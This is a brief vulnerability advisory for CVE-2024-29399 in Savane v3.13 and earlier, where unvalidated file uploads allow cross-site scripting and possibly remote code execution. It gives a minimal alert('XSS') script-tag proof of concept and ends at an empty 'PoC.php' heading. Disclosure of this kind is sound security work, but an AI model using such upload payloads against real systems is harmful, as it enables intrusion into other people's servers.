# CVE-2024-29399 Vulnerability Details

## Overview

In Savane v3.13 and prior, a lack of validation on uploaded files can allow for privilege escalation. Web servers configured according to the installation instructions are vulnerable to Cross-Site Scripting (XSS). In misconfigured web servers this can lead to Remote Code Execution (RCE).

**CWE Classification:** CWE-434: Unrestricted Upload of File with Dangerous Type

**Reported By:** Ally Petitt

```
<script>
  alert("XSS");
</script>
```

**PoC.php**
